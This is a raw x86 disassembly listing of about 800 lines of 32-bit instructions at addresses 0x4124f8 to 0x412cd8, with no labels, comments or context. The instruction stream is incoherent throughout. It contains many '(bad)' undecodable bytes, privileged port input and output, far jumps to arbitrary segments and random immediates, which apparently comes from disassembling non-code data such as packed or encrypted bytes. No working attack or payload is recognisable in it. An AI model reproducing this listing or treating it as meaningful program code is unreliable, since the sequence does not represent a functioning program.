  4124f8:	add    DWORD PTR [edx-0x7579b5ce],0xd
  4124ff:	mov    ebp,esi
  412501:	mov    eax,ds:0xfcdda309
  412506:	dec    ecx
  412507:	sub    ebx,edi
  412509:	jo     0x4124c0
  41250b:	sub    eax,0xc9d12abf
  412510:	mov    dh,BYTE PTR [ecx-0x74eb1151]
  412516:	and    esi,edi
  412518:	aas    
  412519:	in     eax,0x3d
  41251b:	jne    0x412589
  41251d:	dec    eax
  41251e:	push   0x5a
  412520:	(bad)  
  412522:	(bad)  
  412523:	out    dx,al
  412524:	and    BYTE PTR [eax+edx*1-0x40],dh
  412528:	bound  ebx,QWORD PTR [ebx-0x47]
  41252b:	xchg   esp,ebp
  41252d:	dec    eax
  41252e:	ins    DWORD PTR es:[edi],dx
  41252f:	leave  
  412530:	mov    dl,0xbd
  412532:	adc    DWORD PTR [eax+0x19ff4298],edi
  412538:	fisub  WORD PTR [ebx+0x6faa3458]
  41253e:	into   
  41253f:	xlat   BYTE PTR ds:[ebx]
  412540:	adc    BYTE PTR es:[eax],bl
  412543:	xor    ch,BYTE PTR [ebx-0x2f]
  412546:	sti    
  412547:	add    DWORD PTR [esp+ebx*1],ebx
  41254a:	cmp    ah,dh
  41254c:	(bad)  
  41254d:	pop    ss
  41254e:	in     al,dx
  41254f:	add    eax,0xc8484d55
  412554:	ins    DWORD PTR es:[edi],dx
  412555:	dec    edi
  412556:	ss into 
  412558:	push   eax
  412559:	xor    al,0x2e
  41255b:	jno    0x412519
  41255d:	icebp  
  41255e:	mov    eax,ds:0xb6b91543
  412563:	jg     0x412537
  412565:	add    BYTE PTR [ecx+0x731bd3d4],ch
  41256b:	shr    esi,0x20
  41256e:	(bad)  
  41256f:	stos   BYTE PTR es:[edi],al
  412570:	in     al,0x10
  412572:	inc    ecx
  412573:	push   0x2fdad1bb
  412578:	mov    ah,dh
  41257a:	fwait
  41257b:	out    0x59,eax
  41257d:	jecxz  0x412548
  41257f:	mov    ebx,0x7a63776
  412584:	pandn  mm1,QWORD PTR [edi]
  412587:	xor    al,0xd0
  412589:	mov    eax,0x8f64ec41
  41258e:	xchg   ebp,eax
  41258f:	pop    edi
  412590:	cmp    BYTE PTR [ebx+0x36a20291],al
  412596:	push   ss
  412597:	test   bh,bh
  412599:	push   edx
  41259a:	xor    esi,DWORD PTR [eax]
  41259c:	and    BYTE PTR [ecx+ecx*4-0x7510467b],bl
  4125a3:	adc    BYTE PTR [eax],ch
  4125a5:	in     al,dx
  4125a6:	dec    ecx
  4125a7:	ror    DWORD PTR [eax+ebx*1+0x59],0x74
  4125ac:	call   0x3196:0x85366512
  4125b3:	or     esp,DWORD PTR [ecx-0x20e184db]
  4125b9:	mov    edi,0xb5cc22c7
  4125be:	and    al,0x84
  4125c0:	xchg   ebx,eax
  4125c1:	mov    edi,0x6b95aa3e
  4125c6:	jbe    0x412566
  4125c8:	pop    DWORD PTR [edi*8-0x640355c0]
  4125cf:	fadd   DWORD PTR [ebx]
  4125d1:	dec    edi
  4125d2:	ins    BYTE PTR es:[edi],dx
  4125d3:	xor    BYTE PTR [ecx-0x62ead15b],cl
  4125d9:	jmp    0xd02a:0x94e8
  4125df:	fs add eax,0xc8776854
  4125e5:	les    eax,FWORD PTR [ebp+0xb139f9e]
  4125eb:	jnp    0x4125cb
  4125ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125ee:	xor    bh,BYTE PTR ds:0x670aea7f
  4125f4:	xor    BYTE PTR [ebp+eax*8-0x74],al
  4125f8:	popa   
  4125f9:	imul   eax,DWORD PTR [ebx-0x47cac463],0xb0d6ac1b
  412603:	test   eax,0x17bca55a
  412608:	shl    DWORD PTR [eax+0x4a],cl
  41260b:	xor    al,0x2d
  41260d:	inc    esi
  41260e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41260f:	pop    ds
  412610:	add    eax,0x3a1450bf
  412615:	(bad)  
  412616:	jl     0x4125ad
  412618:	inc    edx
  412619:	shl    ebp,1
  41261b:	push   edi
  41261c:	jmp    0x41269a
  41261e:	(bad)  
  41261f:	cmp    dh,ch
  412621:	fbld   TBYTE PTR [ebp+esi*4-0x6d]
  412625:	stos   BYTE PTR es:[edi],al
  412626:	cmc    
  412627:	and    BYTE PTR [esi],0x78
  41262a:	mov    gs,WORD PTR [eax-0x256dc3ba]
  412630:	(bad)  
  412631:	xor    BYTE PTR [edx-0x2f],dl
  412634:	in     al,dx
  412635:	std    
  412636:	inc    edi
  412637:	jg     0x4125d8
  412639:	nop
  41263a:	dec    esp
  41263b:	inc    eax
  41263c:	cmc    
  41263d:	in     eax,dx
  41263e:	pop    ebp
  412640:	push   esp
  412641:	mov    ebp,0xf13e7057
  412646:	inc    esp
  412647:	sub    esi,ebx
  412649:	(bad)  
  41264a:	jmp    0x412654
  41264c:	mov    esp,0xed5d1e9a
  412651:	jge    0x412685
  412653:	in     al,dx
  412654:	adc    eax,0x2c26e99c
  412659:	xstore-rng (bad)
  41265a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41265b:	les    ebx,FWORD PTR [esp+eax*2+0x65]
  41265f:	jmp    0x21003d89
  412664:	mov    al,0x51
  412666:	leave  
  412667:	jmp    0x412608
  412669:	pusha  
  41266a:	cmp    ebp,DWORD PTR [eax-0x56e3fa09]
  412670:	fs test al,0x22
  412673:	(bad)  
  412674:	test   BYTE PTR [edx],0xc
  412677:	mov    ebp,0xb3e00a99
  41267c:	in     eax,dx
  41267d:	stc    
  41267e:	push   esi
  41267f:	mov    al,BYTE PTR [esi]
  412681:	xchg   esi,eax
  412682:	add    eax,ecx
  412684:	(bad)  
  412685:	icebp  
  412686:	retf   0xae7f
  412689:	into   
  41268a:	shl    BYTE PTR [eax+0x5e1fe284],0x11
  412691:	in     eax,dx
  412692:	loope  0x412622
  412694:	or     esp,DWORD PTR [ecx+0xe]
  412697:	ins    DWORD PTR es:[edi],dx
  412698:	jle    0x4126a4
  41269a:	out    dx,al
  41269b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41269c:	adc    al,bl
  41269e:	mov    esi,0x2dee5068
  4126a3:	scas   eax,DWORD PTR es:[edi]
  4126a4:	mov    edi,0x83efd94d
  4126a9:	(bad)  
  4126aa:	es addr16 inc esi
  4126ad:	xchg   edx,eax
  4126ae:	cwde   
  4126af:	add    eax,0xc410463
  4126b4:	(bad)  
  4126b5:	sub    BYTE PTR [ecx-0x1ccb8b9b],ah
  4126bb:	clc    
  4126bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126bd:	aas    
  4126be:	(bad)  
  4126bf:	cmp    edi,DWORD PTR [edi-0x6f5b751b]
  4126c5:	dec    ebp
  4126c6:	mov    eax,ds:0xda37441d
  4126cb:	cli    
  4126cc:	fisttp WORD PTR [eax+0x5fa0abdd]
  4126d2:	test   BYTE PTR [ecx+0x765d1a25],cl
  4126d8:	mov    ch,0x1
  4126da:	or     eax,0x82148116
  4126df:	adc    DWORD PTR [edx-0xea2469b],eax
  4126e5:	popa   
  4126e6:	mov    WORD PTR [esi+0x43a3f00f],ss
  4126ec:	(bad)  
  4126ed:	int3   
  4126ee:	xlat   BYTE PTR ds:[ebx]
  4126ef:	xor    eax,0x69fbd4d6
  4126f4:	pushf  
  4126f5:	ds mov edi,0x4de728a1
  4126fb:	push   ecx
  4126fc:	sbb    DWORD PTR [ebx-0x9c819f9],esi
  412702:	test   BYTE PTR [edx],0x9d
  412705:	jbe    0x412750
  412707:	call   0xfa0c:0x33417dfc
  41270e:	push   0x161dec39
  412713:	in     eax,dx
  412714:	ins    DWORD PTR es:[edi],dx
  412715:	jns    0x4126fa
  412717:	pop    ebx
  412718:	adc    edx,ecx
  41271a:	dec    edx
  41271b:	lods   eax,DWORD PTR ds:[esi]
  41271c:	push   0xfffffff9
  41271e:	push   edx
  41271f:	or     DWORD PTR [ecx+0x7f31e028],ecx
  412725:	ss retf 0xc917
  412729:	and    DWORD PTR [eax+ebx*2-0x2d53cca],ebx
  412730:	push   ss
  412731:	pop    esp
  412732:	mov    edx,0xb5a0712e
  412737:	test   eax,0x80451661
  41273c:	pusha  
  41273d:	push   ebp
  41273e:	adc    eax,0x18c84fd9
  412743:	into   
  412744:	enter  0x83fc,0x52
  412748:	mov    ?,WORD PTR [eax]
  41274a:	mov    edx,0x1bb0ef60
  41274f:	popf   
  412750:	xor    BYTE PTR [edx],ah
  412752:	adc    eax,0xec700274
  412757:	push   esi
  412758:	retf   
  412759:	mov    dh,0xa7
  41275b:	push   edx
  41275c:	push   cs
  41275d:	inc    esi
  41275e:	push   ds
  41275f:	(bad)  
  412760:	and    esi,DWORD PTR [ebp+0x46]
  412763:	jne    0x412778
  412765:	cmp    eax,0xf2e79d6c
  41276a:	retf   
  41276b:	pop    ds
  41276c:	imul   edx,DWORD PTR [ecx+esi*1+0x18],0x49
  412771:	add    edx,DWORD PTR [eax]
  412773:	cmp    eax,0xfcc39719
  412778:	aaa    
  412779:	xor    edi,esp
  41277b:	sbb    BYTE PTR [eax],dh
  41277d:	in     al,0x97
  41277f:	shl    DWORD PTR [ebx],cl
  412781:	dec    edx
  412782:	cmp    DWORD PTR [edx],ebx
  412784:	enter  0x332d,0x45
  412788:	sbb    cl,BYTE PTR [edx]
  41278a:	cld    
  41278b:	das    
  41278c:	fcomip st,st(0)
  41278e:	xor    DWORD PTR [edi],ecx
  412790:	ss dec esp
  412792:	out    0x13,al
  412794:	push   eax
  412795:	jmp    0xd86f69b5
  41279a:	jmp    0x86d53da9
  41279f:	retf   0x13c5
  4127a2:	(bad)  
  4127a3:	(bad)  
  4127a4:	aad    0x98
  4127a6:	adc    eax,0xc94e8212
  4127ab:	jo     0x4127f4
  4127ad:	jmp    0xbc662c54
  4127b2:	jae    0x4127ed
  4127b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127b5:	outs   dx,BYTE PTR ds:[esi]
  4127b6:	or     bh,BYTE PTR [eax+0xf]
  4127b9:	ins    DWORD PTR es:[edi],dx
  4127ba:	in     eax,dx
  4127bb:	or     ebx,DWORD PTR [esi+0x33]
  4127be:	mov    cl,0xdf
  4127c0:	ins    BYTE PTR es:[edi],dx
  4127c1:	mov    eax,es
  4127c3:	cmc    
  4127c4:	sub    ebp,DWORD PTR [ebx-0xec1d873]
  4127ca:	dec    ecx
  4127cb:	stos   DWORD PTR es:[edi],eax
  4127cc:	mov    bl,BYTE PTR [edi-0x6]
  4127cf:	fsubr  QWORD PTR [esi+0x725da85d]
  4127d5:	xchg   DWORD PTR [ecx+0x21],ebx
  4127d8:	je     0x4127bd
  4127da:	(bad)  
  4127db:	not    ch
  4127dd:	fldcw  WORD PTR [ebx-0x5817be20]
  4127e3:	lahf   
  4127e4:	stos   DWORD PTR es:[edi],eax
  4127e5:	fmul   QWORD PTR [ebp+0x3]
  4127e8:	es icebp 
  4127ea:	jns    0x4127b4
  4127ec:	push   ecx
  4127ed:	jbe    0x4127a5
  4127ef:	daa    
  4127f0:	push   cs
  4127f1:	pop    ebp
  4127f2:	xor    DWORD PTR [eax-0x2c],edx
  4127f5:	fdiv   DWORD PTR [ebx-0x24]
  4127f8:	mov    ds:0xa9465840,eax
  4127fd:	mov    ecx,0x81a56765
  412802:	push   esi
  412803:	add    eax,0x91e1017e
  412808:	push   0x9
  41280a:	arpl   WORD PTR [esi],bp
  41280c:	sub    esi,DWORD PTR [eax]
  41280e:	test   eax,0x6d3420a8
  412813:	dec    ebx
  412814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412815:	(bad)  
  412816:	daa    
  412817:	cmc    
  412818:	jg     0x41284f
  41281a:	call   0xb8a30e39
  41281f:	jl     0x4127ad
  412821:	(bad)  
  412822:	imul   edi,eax,0xffffffa4
  412825:	cmc    
  412826:	shl    BYTE PTR [esi-0x2a74cdcd],1
  41282c:	push   ebp
  41282d:	cmp    al,0x89
  41282f:	adc    DWORD PTR [edi+0x2410d387],edx
  412835:	pop    ecx
  412836:	test   al,0x34
  412838:	push   edi
  412839:	cmp    al,0x27
  41283b:	push   eax
  41283c:	icebp  
  41283d:	jno    0x4127ff
  41283f:	jae    0x4128b5
  412841:	cdq    
  412842:	ret    0x936c
  412845:	fwait
  412846:	test   BYTE PTR [ebp-0x20],dl
  412849:	data16 pop bx
  41284c:	cdq    
  41284d:	test   BYTE PTR [ebx-0x30e83490],ah
  412853:	cwde   
  412854:	je     0x4127ff
  412856:	test   DWORD PTR ds:0xe84a1ce,0x3614b1e3
  412860:	in     al,dx
  412861:	xchg   ebx,eax
  412862:	mov    esi,0x5134aad
  412867:	mov    edi,0xf2449584
  41286c:	adc    dl,BYTE PTR [edx]
  41286e:	test   al,0x54
  412870:	add    eax,0x9eb6664e
  412875:	ss push es
  412877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412878:	xchg   ecx,eax
  412879:	or     eax,0x14a64ff1
  41287e:	mov    BYTE PTR [ebx-0x42],bh
  412881:	mov    dh,0x61
  412883:	fcmovnb st,st(0)
  412885:	sahf   
  412886:	add    eax,ebx
  412888:	shr    BYTE PTR [esp+esi*1],0xee
  41288c:	sbb    ecx,DWORD PTR [eax]
  41288e:	add    DWORD PTR [esi-0x3c3d162d],0x5732dc24
  412898:	push   eax
  412899:	retf   
  41289a:	or     ch,BYTE PTR [edx+0x3f]
  41289d:	(bad)  
  41289f:	xchg   DWORD PTR [edi],esp
  4128a1:	mov    esi,0xa48fbb5d
  4128a6:	and    dl,al
  4128a8:	pop    ss
  4128a9:	lock inc eax
  4128ab:	and    al,0xe4
  4128ad:	retf   0xd2b6
  4128b0:	ds nop
  4128b2:	retf   
  4128b3:	sti    
  4128b4:	icebp  
  4128b5:	test   BYTE PTR [eax],0x97
  4128b8:	shl    DWORD PTR [esi-0x10c38145],1
  4128be:	sbb    BYTE PTR [edx],cl
  4128c0:	call   0x5f714578
  4128c5:	mov    ds:0xaf66b47,eax
  4128ca:	(bad)  
  4128cb:	clc    
  4128cc:	call   0xb70f:0x4325228e
  4128d3:	jne    0x412951
  4128d5:	add    ebx,DWORD PTR [edx+0x17a7981a]
  4128db:	leave  
  4128dc:	pusha  
  4128dd:	push   cs
  4128de:	jmp    0x4128fd
  4128e0:	outs   dx,BYTE PTR ds:[esi]
  4128e1:	(bad)  [ebx+0x7d721727]
  4128e7:	add    BYTE PTR [esi+ecx*2+0x3aabc0c8],dh
  4128ee:	dec    ecx
  4128ef:	and    DWORD PTR [ebx+0x10],ecx
  4128f2:	shl    DWORD PTR [edi],1
  4128f4:	mov    ch,BYTE PTR [ebx]
  4128f6:	inc    ecx
  4128f7:	lock and ah,bl
  4128fa:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128fc:	adc    esp,DWORD PTR [ebx+edx*2]
  4128ff:	nop
  412900:	mov    ds:0xf9b92792,al
  412905:	(bad)  
  412906:	jmp    0xbcdc:0x973ae32f
  41290d:	retf   
  41290e:	(bad)  
  41290f:	sub    edi,DWORD PTR [ebx]
  412911:	pop    edx
  412912:	jb     0x412928
  412914:	push   ds
  412915:	pop    es
  412916:	stc    
  412917:	xor    BYTE PTR [eax],0xf9
  41291a:	pop    es
  41291b:	data16 je 0x412953
  41291e:	or     ebp,DWORD PTR [esp+ebp*8+0x3c]
  412922:	in     al,0x86
  412924:	sbb    al,0xa6
  412926:	sub    eax,0xa6b785cd
  41292b:	fbld   TBYTE PTR [ecx]
  41292d:	mov    ch,0x31
  41292f:	jmp    0x4128eb
  412931:	cdq    
  412932:	cs das 
  412934:	nop
  412935:	push   ecx
  412936:	fisub  WORD PTR [esi]
  412938:	cs popf 
  41293a:	dec    ebx
  41293b:	neg    DWORD PTR [eax+esi*1-0x512a35b6]
  412942:	data16 out 0x80,al
  412945:	ds and al,bh
  412948:	dec    edi
  412949:	inc    esp
  41294a:	lods   eax,DWORD PTR ds:[esi]
  41294b:	mov    ch,0xe3
  41294d:	cmc    
  41294e:	(bad)  [esi-0xa9129b9]
  412954:	jb     0x412918
  412956:	mov    DWORD PTR [edi+0x619f36e4],esp
  41295c:	pop    edx
  41295d:	jmp    0x4104:0x88cd45a2
  412964:	in     al,dx
  412965:	xor    dh,0x97
  412968:	mov    bh,0x4f
  41296a:	stos   BYTE PTR es:[edi],al
  41296b:	dec    esi
  41296c:	push   cs
  41296d:	xor    al,BYTE PTR ds:0x404372de
  412973:	lds    ebp,FWORD PTR [edi-0x62]
  412976:	mov    cl,0xb0
  412978:	mov    bl,0x9d
  41297a:	repnz mov ds:0xe678f7fe,al
  412980:	inc    edx
  412981:	jb     0x4129c6
  412983:	mov    edi,0x4b115cc1
  412988:	sub    ebp,esp
  41298a:	fcmovbe st,st(7)
  41298c:	sub    ebp,ebx
  41298e:	mov    ebp,0x910bc6
  412993:	imul   eax,esp,0xee5cea7
  412999:	push   eax
  41299a:	fs in  eax,dx
  41299c:	mov    esp,0xede3dc86
  4129a1:	or     al,0x4b
  4129a3:	inc    esi
  4129a4:	sbb    dl,bh
  4129a6:	or     al,0x97
  4129a8:	inc    esp
  4129a9:	xchg   ebx,eax
  4129aa:	js     0x4129fe
  4129ac:	sub    BYTE PTR [esi+ebx*2],cl
  4129af:	sbb    BYTE PTR [edi+0x4e],al
  4129b2:	mov    bh,BYTE PTR [esi-0x55]
  4129b5:	in     eax,0x3c
  4129b7:	and    bh,BYTE PTR [ebx-0x63]
  4129ba:	add    al,0x8a
  4129bd:	xchg   esp,esp
  4129bf:	outs   dx,BYTE PTR ds:[esi]
  4129c0:	inc    eax
  4129c1:	stos   DWORD PTR es:[edi],eax
  4129c2:	add    DWORD PTR [edx+0x7a],0x30
  4129c6:	pop    esp
  4129c7:	mov    BYTE PTR [ecx+esi*8+0x1eca1b4],cl
  4129ce:	adc    ah,BYTE PTR [eax-0x49]
  4129d1:	mov    ch,cl
  4129d3:	mov    ebp,0xc3a18f5e
  4129d8:	mov    edi,0xb3d5eed6
  4129dd:	adc    BYTE PTR [ebx+edi*2-0x28710df6],dh
  4129e4:	aaa    
  4129e5:	add    al,0x6c
  4129e7:	mov    al,0x46
  4129e9:	mov    al,0x44
  4129eb:	shl    BYTE PTR [eax],0x66
  4129ee:	cld    
  4129ef:	inc    esi
  4129f0:	ss retf 
  4129f2:	ret    
  4129f3:	les    edx,FWORD PTR [edi+ecx*8+0x474dc3ae]
  4129fa:	push   esi
  4129fb:	or     esi,DWORD PTR [ebx]
  4129fd:	stc    
  4129fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129ff:	imul   esi,DWORD PTR [ebx],0x16
  412a02:	lea    esp,[esi+0x19]
  412a05:	cmp    al,0x71
  412a07:	call   0x9d9d:0x25043c0e
  412a0e:	lea    esi,[ebx+0x14]
  412a11:	jg     0x4129fb
  412a13:	popa   
  412a14:	dec    edi
  412a15:	pop    esi
  412a16:	or     esp,edx
  412a18:	bound  ebx,QWORD PTR [edi]
  412a1a:	pop    ss
  412a1b:	test   eax,0x93f6e905
  412a20:	mov    eax,ds:0x46cb200c
  412a25:	nop
  412a26:	call   0x63701cb0
  412a2b:	mov    ah,0x9b
  412a2d:	sub    dh,bh
  412a2f:	nop
  412a30:	repnz dec esp
  412a32:	and    eax,0x384ecb15
  412a37:	call   0xfbdb0500
  412a3c:	(bad)  
  412a3d:	jge    0x412a70
  412a3f:	pop    esi
  412a40:	popf   
  412a41:	mov    edx,0x637ab2b9
  412a46:	fldlg2 
  412a48:	xor    cl,BYTE PTR ss:[esi-0xdf06cc9]
  412a4f:	lock sub ch,ch
  412a52:	xchg   edi,eax
  412a53:	div    BYTE PTR [edi]
  412a55:	or     edi,DWORD PTR [ecx]
  412a57:	nop
  412a58:	dec    edi
  412a59:	je     0x412a18
  412a5b:	inc    si
  412a5d:	or     ch,bh
  412a5f:	ud2    
  412a61:	jnp    0x412ac2
  412a63:	add    eax,0x25c7e540
  412a68:	shl    bh,cl
  412a6a:	icebp  
  412a6b:	lds    ebx,FWORD PTR [eax-0x21f44194]
  412a71:	shr    DWORD PTR [ecx+0x67],1
  412a74:	mov    esi,0x57709797
  412a79:	jb     0x412a93
  412a7b:	daa    
  412a7c:	into   
  412a7d:	stc    
  412a7e:	shr    DWORD PTR [ebp-0x30],1
  412a81:	mov    al,0x76
  412a83:	pop    esp
  412a84:	dec    edi
  412a85:	mov    al,ds:0x9b1db7bb
  412a8a:	inc    ebx
  412a8b:	iret   
  412a8c:	jle    0x412a4b
  412a8e:	pop    eax
  412a8f:	xor    ebx,edi
  412a91:	repnz add BYTE PTR [esi],ah
  412a94:	mov    ebp,0xffe54219
  412a99:	and    ebx,DWORD PTR [ecx-0x27c43c0a]
  412a9f:	out    dx,eax
  412aa0:	(bad)  
  412aa1:	push   ds
  412aa2:	cld    
  412aa3:	pop    ecx
  412aa4:	jp     0x412a53
  412aa6:	jae    0x412ac0
  412aa8:	xchg   dl,dl
  412aaa:	fucomi st,st(1)
  412aac:	mov    bh,0xd3
  412aae:	(bad)  
  412aaf:	aas    
  412ab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ab1:	xor    al,0x5c
  412ab3:	inc    edx
  412ab4:	mov    dh,0x4d
  412ab6:	mov    WORD PTR [edx-0x7bf7348d],fs
  412abc:	cmp    al,0x25
  412abe:	pushf  
  412abf:	xchg   ebp,eax
  412ac0:	jmp    ecx
  412ac2:	xor    bh,al
  412ac4:	jne    0x412ad1
  412ac6:	cmp    al,0x6e
  412ac8:	and    cl,BYTE PTR [ebp+0x3f]
  412acb:	mov    eax,ds:0x75dccb25
  412ad0:	inc    esi
  412ad1:	fld    DWORD PTR [esp+edi*4-0x7d]
  412ad5:	cli    
  412ad6:	dec    ebp
  412ad7:	enter  0x7d,0xe3
  412adb:	mov    ecx,0x271e31e6
  412ae0:	mov    ch,0x84
  412ae2:	mov    dh,0xd1
  412ae4:	scas   al,BYTE PTR es:[edi]
  412ae5:	jecxz  0x412b23
  412ae7:	or     eax,0x47e0be9c
  412aec:	sub    dh,dh
  412aee:	cmp    cl,BYTE PTR [esi+eiz*1]
  412af1:	dec    edi
  412af2:	pop    es
  412af3:	test   eax,0x5460f119
  412af8:	add    bl,BYTE PTR ds:0x28453931
  412afe:	shl    DWORD PTR [eax],0x8c
  412b01:	dec    eax
  412b02:	lock sbb eax,0x30f0a040
  412b08:	jg     0x412b20
  412b0a:	and    DWORD PTR [esi],eax
  412b0c:	add    edi,ecx
  412b0e:	rol    DWORD PTR [eax],1
  412b10:	dec    edx
  412b11:	jo     0x412b51
  412b13:	sbb    bl,bl
  412b15:	lock test DWORD PTR [eax-0x2bcd6371],0x88dcd6c7
  412b20:	sub    al,0x67
  412b22:	in     al,0x69
  412b24:	and    al,0xa0
  412b26:	cmp    BYTE PTR [esi+0x29432827],ch
  412b2c:	imul   ecx,DWORD PTR [ecx+0x34],0xb885e1fe
  412b33:	mov    ds:0x7e17236e,al
  412b38:	jb     0x412bb7
  412b3a:	test   BYTE PTR [ebp+0x4a],0xed
  412b3e:	add    dl,BYTE PTR [esp+ebx*8]
  412b41:	int3   
  412b42:	push   0xdc0ec2bd
  412b47:	data16 or BYTE PTR cs:[eax-0x62463b66],0x47
  412b50:	inc    esi
  412b51:	ds pop ss
  412b53:	or     eax,0xee157af0
  412b58:	sbb    BYTE PTR [esi],bh
  412b5a:	mov    WORD PTR [esi+0x28e36fd2],gs
  412b60:	mov    ebx,0x6115ae26
  412b65:	pop    ebx
  412b66:	aad    0x96
  412b68:	ret    
  412b69:	add    ch,dh
  412b6b:	mov    bh,0xd3
  412b6d:	pop    ecx
  412b6e:	ins    DWORD PTR es:[edi],dx
  412b6f:	scas   al,BYTE PTR es:[edi]
  412b70:	enter  0xa957,0x5
  412b74:	xor    DWORD PTR [esp+ecx*1+0x71f1bfaf],edi
  412b7b:	pop    esi
  412b7c:	mov    ch,0x8a
  412b7e:	push   eax
  412b7f:	dec    esi
  412b80:	pop    eax
  412b81:	in     eax,0x91
  412b83:	push   0x45
  412b85:	mov    BYTE PTR [edi-0xd],dl
  412b88:	lods   al,BYTE PTR ds:[esi]
  412b89:	xchg   ebx,eax
  412b8a:	push   ss
  412b8b:	xchg   ecx,eax
  412b8c:	test   eax,ebx
  412b8e:	sub    cl,al
  412b90:	sbb    al,0x3b
  412b92:	cmp    BYTE PTR [esi],0xd2
  412b95:	lds    ebx,FWORD PTR ds:0xa3038c5
  412b9b:	mov    ds:0x98b5440e,eax
  412ba0:	jmp    0x8b0b4e1f
  412ba5:	and    eax,0x9a497358
  412baa:	jp     0x412c27
  412bac:	dec    ebx
  412bad:	(bad)  
  412bae:	sahf   
  412baf:	scas   al,BYTE PTR es:[edi]
  412bb0:	ins    DWORD PTR es:[edi],dx
  412bb1:	call   0x9d17b0f3
  412bb6:	mov    dh,0x84
  412bb8:	test   al,0x8c
  412bba:	je     0x412b74
  412bbc:	neg    BYTE PTR [ebp-0xd8715a9]
  412bc2:	ins    DWORD PTR es:[di],dx
  412bc4:	xlat   BYTE PTR ds:[ebx]
  412bc5:	int    0x18
  412bc7:	cmp    al,0xfc
  412bc9:	xchg   edi,eax
  412bca:	mov    cl,0xb6
  412bcc:	sar    BYTE PTR [edx],cl
  412bce:	cld    
  412bcf:	inc    edi
  412bd0:	enter  0xc64f,0xf
  412bd4:	(bad)  
  412bd5:	and    eax,0xfffedb5a
  412bda:	push   edx
  412bdb:	add    DWORD PTR [eax-0x51],ebp
  412bde:	fidiv  DWORD PTR fs:[edi]
  412be1:	jg     0x412b77
  412be3:	or     eax,0xb02eeddd
  412be8:	dec    eax
  412be9:	cmp    bh,BYTE PTR [ebx]
  412beb:	xlat   BYTE PTR ds:[ebx]
  412bec:	mov    ds:0x7d13d77a,al
  412bf1:	das    
  412bf2:	xchg   esi,eax
  412bf3:	xchg   DWORD PTR [esp+ebx*4],ebx
  412bf6:	fs jl  0x412b8e
  412bf9:	inc    ebx
  412bfa:	pop    ecx
  412bfb:	and    ebx,ebx
  412bfd:	xchg   bh,bl
  412bff:	jbe    0x412c48
  412c01:	inc    eax
  412c02:	or     BYTE PTR [ebx+0x4a],bh
  412c05:	and    dl,cl
  412c07:	dec    edi
  412c08:	push   cs
  412c09:	inc    ebx
  412c0a:	xor    DWORD PTR ds:0xe84bedfd,edx
  412c10:	mov    al,dl
  412c12:	xor    dl,BYTE PTR [edi]
  412c14:	ret    
  412c15:	inc    ebp
  412c16:	or     al,0x56
  412c18:	(bad)  
  412c19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c1a:	mov    dl,0xf5
  412c1c:	push   ds
  412c1d:	mov    dl,bl
  412c1f:	sti    
  412c20:	(bad)  
  412c22:	ret    0xb9e1
  412c25:	mov    ds:0x9dfd25f6,al
  412c2a:	in     eax,dx
  412c2b:	sbb    DWORD PTR es:[eax+0x5aadf159],ecx
  412c32:	out    0x30,eax
  412c34:	mov    dh,0xb8
  412c36:	mov    edx,0xb282e302
  412c3b:	jb     0x412c54
  412c3d:	xor    DWORD PTR [edi],esi
  412c3f:	outs   dx,DWORD PTR ds:[esi]
  412c40:	scas   eax,DWORD PTR es:[edi]
  412c41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c42:	clc    
  412c43:	shr    DWORD PTR [edx+0x46bd9e6a],1
  412c49:	clc    
  412c4a:	outs   dx,BYTE PTR ds:[esi]
  412c4b:	or     DWORD PTR [ecx+ecx*4],ecx
  412c4e:	test   DWORD PTR [edx+0x2a],ebx
  412c51:	push   esi
  412c52:	test   al,0xd3
  412c54:	loopne 0x412bf9
  412c56:	push   cs
  412c57:	mov    ebp,0x737b49c7
  412c5c:	popf   
  412c5d:	pop    esp
  412c5e:	(bad)  
  412c5f:	lock into 
  412c61:	in     eax,dx
  412c62:	mov    DWORD PTR [ecx],ebx
  412c64:	cli    
  412c65:	out    dx,al
  412c66:	sub    al,0x4c
  412c68:	mov    ch,0x8f
  412c6a:	dec    edi
  412c6b:	test   eax,0xc5a5c4b0
  412c70:	lea    ebx,[ebp+0x114a3251]
  412c76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c77:	adc    cl,BYTE PTR [edx+esi*8]
  412c7a:	cdq    
  412c7b:	test   DWORD PTR [eax-0x44],esp
  412c7e:	xchg   ebp,eax
  412c7f:	test   al,0x99
  412c81:	push   0x4184ed89
  412c86:	xchg   ecx,eax
  412c87:	mov    bl,0x3b
  412c89:	and    DWORD PTR [edi+0x3c27e8c9],edx
  412c8f:	lock mov ds:0x1025ded3,al
  412c95:	pop    esp
  412c96:	sbb    ecx,edi
  412c98:	ja     0x412c94
  412c9a:	lahf   
  412c9b:	mov    cl,BYTE PTR [eax]
  412c9d:	das    
  412c9e:	or     ecx,eax
  412ca0:	mov    bh,0x8a
  412ca2:	sub    edx,esi
  412ca4:	add    DWORD PTR [esi-0x3f84c2fa],0x31
  412cab:	jmp    0x412cea
  412cad:	int    0x81
  412caf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cb0:	mov    dh,ah
  412cb2:	rcr    BYTE PTR [eax-0x6b],1
  412cb5:	jg     0x412c6b
  412cb7:	clc    
  412cb8:	outs   dx,BYTE PTR ds:[esi]
  412cb9:	add    DWORD PTR [esi],ebp
  412cbb:	xchg   ecx,eax
  412cbc:	clc    
  412cbd:	cmp    al,0x7f
  412cbf:	nop
  412cc0:	push   0x2ab169ba
  412cc5:	xchg   esi,eax
  412cc6:	pop    ss
  412cc7:	or     eax,0xa1992705
  412ccc:	sub    eax,0x20e79d90
  412cd1:	xchg   edx,eax
  412cd2:	loop   0x412cb7
  412cd4:	inc    bx
  412cd6:	inc    eax
  412cd7:	(bad)  
  412cd8:	ja     0x412ce7
